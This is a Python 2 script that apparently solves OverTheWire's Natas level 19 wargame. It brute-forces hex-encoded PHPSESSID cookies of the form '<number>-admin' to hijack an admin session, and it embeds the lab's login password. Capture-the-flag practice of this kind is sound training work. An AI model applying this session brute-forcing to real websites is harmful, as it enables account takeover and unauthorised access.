#!/usr/bin/env python
import requests

url = "http://natas19.natas.labs.overthewire.org"
authUsername = "natas19"
authPassword = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

wrong = "You are logged in as a regular user. Login as an admin to retrieve credentials for natas20."

for i in range(0, 640):

	cookieString = str(i) + "-admin"
	cookieString = cookieString.encode("hex")
	cookie = {"PHPSESSID": cookieString}
	print "[#] Current cookie: {0} ({1})".format(cookieString.decode("hex"), cookieString)

	r = requests.get(url, cookies=cookie, auth=(authUsername, authPassword))

	if wrong not in r.text:
		
		print "[#] The admin PHPSESSID is {0} ({1})".format(cookieString.decode("hex"), cookieString)
		break